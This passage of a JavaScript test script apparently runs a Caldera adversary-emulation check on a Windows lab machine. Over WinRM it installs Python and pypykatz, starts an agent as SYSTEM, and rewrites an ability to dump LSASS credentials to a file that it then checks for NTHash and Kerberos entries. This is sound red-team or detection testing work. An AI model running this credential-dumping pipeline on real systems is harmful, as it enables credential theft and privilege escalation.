...
async function testFullPipeline() {
  console.log("\n=== Full Pipeline: LSASS read with pypykatz ===")

  const abilityId = "7d1c6222726c67b13740450275dc2162"
  const abilityName = "LSASS read with pypykatz"
  const group = `test-${Date.now()}`
  const taskName = `CalderaSandcat-${group}`
  ...
  try {
    ...
    try {
      const pyCheck = await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "try { $v = python --version 2>&1; Write-Host $v } catch { Write-Host \'MISSING\' }"')
      console.log(`    => Python check: ${pyCheck.trim()}`)
      if (pyCheck.includes("Python") && !pyCheck.includes("not found")) {
        pythonOk = true
      }
    } catch {}
    if (!pythonOk) {
      console.log("    => Python not found, installing 3.10.4 silently...")
      try {
        await winrmRun(WIN11_IP, "localuser", "password",
          'powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest \'https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\' -OutFile \'C:\\Users\\Public\\python_setup.exe\'; Write-Host \'DOWNLOADED\'"')
        console.log("    => Python installer downloaded")
        await winrmRun(WIN11_IP, "localuser", "password",
          'powershell -Command "Start-Process -FilePath \'C:\\Users\\Public\\python_setup.exe\' -ArgumentList \'/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\' -Wait; Write-Host \'INSTALLED\'"')
        console.log("    => Python 3.10.4 installed")
      } catch (err) {
        console.log(`    => Python install failed: ${err.message}`)
      }
    } else {
      console.log("    => Python already present, skipping install")
    }

    // Install pypykatz on Windows (via WinRM where networking works)
    console.log("    => Installing pypykatz via pip...")
    try {
      const pipResult = await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "& \'C:\\Program Files\\Python310\\python.exe\' -m pip install pypykatz 2>&1; Write-Host \'PIP_DONE\'"')
      console.log(`    => pip: ${pipResult.trim().slice(0, 200)}`)
    } catch (err) {
      console.log(`    => pip install failed: ${err.message}`)
    }

    // ── Step 4: Deploy sandcat via Scheduled Task as SYSTEM ──
    console.log(`\n  [4/6] Deploying sandcat as SYSTEM (group=${group})...`)
    ...
    // ── Step 5: Wait for agent + fetch ability + modify command ──
    console.log(`\n  [5/6] Waiting for agent (group=${group})...`)
    ...
    console.log(`\n  [5b/6] Fetching ability "${abilityName}"...`)
    ...
    // ── Step 5c: Modify ability command (PathToAtomicsFolder → pip install + pypykatz) ──
    console.log(`\n  [5c/6] Modifying ability command...`)
    const original = await calderaApi("GET", `/api/v2/abilities/${abilityId}`)
    const modified = structuredClone(original)
    const oldCmd = modified.executors[0].command
    // Replace PathToAtomicsFolder\..\ExternalPayloads\venv_t1003_001\Scripts\pypykatz with pip install + pypykatz
    modified.executors[0].command = `"C:\\Program Files\\Python310\\python.exe" -m pypykatz live lsa > C:\\Users\\Public\\pypykatz_out.txt 2>&1`
    console.log(`    => Command: "${oldCmd}" → "${modified.executors[0].command}"`)

    await calderaApi("PUT", `/api/v2/abilities/${abilityId}`, modified)
    console.log(`    => Ability command updated`)

    // ── Step 6: Exploit agent with ability ──
    console.log(`\n  [6/6] Exploiting agent with ability...`)
    ...
    // ── Verify pypykatz output file ──
    console.log(`\n  [verify] Checking pypykatz output file...`)
    let hasCredentials = false
    let outputSize = ""
    try {
      const outCheck = await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "if (Test-Path \'C:\\Users\\Public\\pypykatz_out.txt\') { $f=Get-Item \'C:\\Users\\Public\\pypykatz_out.txt\'; $content=Get-Content \'C:\\Users\\Public\\pypykatz_out.txt\' -Raw; Write-Host \\"EXISTS $([math]::Round($f.Length/1024,1))KB\\"; Write-Host $content } else { Write-Host \\"MISSING\\" }"')
      console.log(`    => ${outCheck.slice(0, 300)}`)
      if (outCheck.includes("EXISTS")) {
        outputSize = outCheck.match(/EXISTS (\S+)/)?.[1] || ""
        const indicators = ["Username:", "Domain:", "Kerberos", "NTHash", "msv", "wdigest", "credman"]
        for (const ind of indicators) {
          if (outCheck.includes(ind)) {
            hasCredentials = true
            break
          }
        }
      ...
      if (hasCredentials) {
        console.log(`    => Found credentials in output (${outputSize})`)
      } else if (outCheck.includes("EXISTS")) {
        console.log(`    => Output file exists (${outputSize}) but no credential indicators found`)
        // Show first 500 chars for debugging
        const contentStart = outCheck.indexOf("KB") > 0 ? outCheck.slice(outCheck.indexOf("KB") + 2).trim().slice(0, 500) : ""
        if (contentStart) console.log(`    => Content: ${contentStart}`)
      }
    } catch (err) {
      console.log(`    => Output file check failed: ${err.message}`)
    }
    ...
    // pypykatz reads LSASS live via Python — output redirected to file.
    // Success: output file exists with credential indicators.
    const passed = hasCredentials
    const reason = hasCredentials ? `output ${outputSize} with credentials` : linkFacts.length > 0 ? `${linkFacts.length} facts` : "no evidence in output file"
    ...
    console.log("\n  [cleanup] Removing agent, task, process, output file, and python installer...")
    ...
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Remove-Item \'C:\\Users\\Public\\pypykatz_out.txt\' -Force -ErrorAction SilentlyContinue; Write-Host \'OUTFILE_DELETED\'"')
      console.log("    pypykatz output file deleted")
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Remove-Item \'C:\\Users\\Public\\python_setup.exe\' -Force -ErrorAction SilentlyContinue; Write-Host \'PYTHON_INSTALLER_DELETED\'"')
      console.log("    python installer deleted")
    } catch {}
...
async function main() {
  ...
  console.log(`  Full pipeline test: agentWait → abilityLookup → commandModify → abilityExploit → cleanup`)
  ...
  console.log(`    - Pass condition: output file exists and contains credential indicators (Username:, Domain:, Kerberos, etc.)`)
  console.log(`    - Agent runs as SYSTEM (Scheduled Task) to have SeDebugPrivilege for LSASS access`)
}
